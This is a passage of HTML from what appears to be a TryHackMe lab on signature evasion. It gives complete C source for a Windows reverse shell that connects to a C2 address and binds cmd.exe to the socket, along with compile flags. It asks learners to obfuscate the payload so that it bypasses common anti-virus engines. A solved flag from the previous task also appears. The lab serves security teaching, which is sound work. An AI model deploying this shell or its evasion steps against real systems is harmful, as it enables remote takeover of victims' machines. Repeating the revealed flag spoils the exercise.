        <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">printf</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"hostname: %s\\n"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> hostName<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span></code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">Once sufficiently obfuscated, submit the snippet to the webserver at&nbsp;<code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">http://MACHINE_IP/challenge-2.html</code>.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The file name must be saved as</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">challenge-2.exe</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">. If correctly obfuscated a flag will appear in an alert pop-up.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                What flag is found after uploading a properly obfuscated snippet?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{******************}" value="THM{N0_1MP0r75_F0r_Y0U}" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="6" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse7" aria-expanded="false" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 7                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Putting It All Together
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent" style="" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="btn-group mb-3 ml-3 float-right" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <button type="button" class="btn btn-success" value="630f9cb46a5d7700533dba0a" onclick="deploy(this)" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-play mr-2" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Start Machine</button>
        </div> <p data-pf_style_display="block" data-pf_style_visibility="visible">As reiterated through both this room and <a href="https://tryhackme.com/room/obfuscationprinciples" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</a>, no one method will be 100% effective or reliable.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">To create a more effective and reliable methodology, we can combine several of the methods covered in this room and the previous.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">When determining what order you want to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated?</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Note: In general, You should run automated obfuscation or less specific obfuscation methods after specific signature breaking, however, you will not need those techniques for this challenge.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Taking these notes into consideration, modify the provided binary to meet the specifications below.</p>
<ol data-pf_style_display="block" data-pf_style_visibility="visible">
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">No suspicious library calls present</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">No leaked function or variable names</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">File hash is different than the original hash</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Binary bypasses common anti-virus engines</li></ol><p data-pf_style_display="block" data-pf_style_visibility="visible">Note: When considering library calls and leaked function, be conscious of the IAT table and strings of your binary.</p><pre class=" language-c" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-c" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;winsock2.h&gt;</span></span>
<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;windows.h&gt;</span></span>
<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;ws2tcpip.h&gt;</span></span>
<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;stdio.h&gt;</span></span>

<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">define</span> <span class="token macro-name" data-pf_style_display="inline" data-pf_style_visibility="visible">DEFAULT_BUFLEN</span> <span class="token expression" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">1024</span></span></span>

<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">void</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">RunShell</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">char</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> C2Server<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> C2Port<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
        SOCKET mySocket<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">struct</span> <span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible">sockaddr_in</span> addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        WSADATA version<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WSAStartup</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">MAKEWORD</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">2</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">2</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>version<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        mySocket <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WSASocketA</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>AF_INET<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> SOCK_STREAM<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> IPPROTO_TCP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>sin_family <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> AF_INET<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

        addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>sin_addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>s_addr <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">inet_addr</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>C2Server<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>sin_port <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">htons</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>C2Port<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">if</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WSAConnect</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>mySocket<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>SOCKADDR<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">sizeof</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>addr<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">==</span>SOCKET_ERROR<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">closesocket</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>mySocket<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WSACleanup</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">else</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">printf</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Connected to %s:%d\\n"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> C2Server<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> C2Port<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

            <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">char</span> Process<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"cmd.exe"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            STARTUPINFO sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            PROCESS_INFORMATION pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">memset</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">sizeof</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>cb <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">sizeof</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>dwFlags <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>STARTF_USESTDHANDLES <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">|</span> STARTF_USESHOWWINDOW<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hStdInput <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hStdOutput <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hStdError <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>HANDLE<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> mySocket<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">CreateProcess</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token constant" data-pf_style_display="inline" data-pf_style_visibility="visible">NULL</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> Process<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token constant" data-pf_style_display="inline" data-pf_style_visibility="visible">NULL</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token constant" data-pf_style_display="inline" data-pf_style_visibility="visible">NULL</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> TRUE<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token constant" data-pf_style_display="inline" data-pf_style_visibility="visible">NULL</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token constant" data-pf_style_display="inline" data-pf_style_visibility="visible">NULL</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>sinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">printf</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Process Created %lu\\n"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>dwProcessId<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WaitForSingleObject</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hProcess<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> INFINITE<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">CloseHandle</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hProcess<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
            <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">CloseHandle</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>pinfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>hThread<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>

<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">main</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> argc<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">char</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span>argv<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
    <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">if</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>argc <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">==</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">3</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> port  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">atoi</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>argv<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">2</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">RunShell</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>argv<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">1</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> port<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>
    <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">else</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">char</span> host<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"10.10.10.10"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> port <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">53</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">RunShell</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>host<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> port<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>
    <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">return</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span> </code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or other C compiler. The file name must be saved as <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">challenge.exe</code>. Once compiled, submit the executable to the webserver at <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">http://MACHINE_IP/</code><a href="http://machine_ip/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">.</a>&nbsp;If your payload satisfies the requirements listed, it will be ran and a beacon will be sent to the provided server IP and port.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Note: It is also essential to change the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C2Server</code> and <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C2Port</code> variables in the provided payload or this challenge will not properly work and you will not receive a shell back.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Note: When compiling with GCC you will need to add compiler options for <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">winsock2</code> and <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ws2tcpip</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">. These libraries can be included using the compiler flags </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-lwsock32</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"> and </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-lws2_32</code></p>

<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">If you are still stuck we have provided a walkthrough of the solution below.</p>
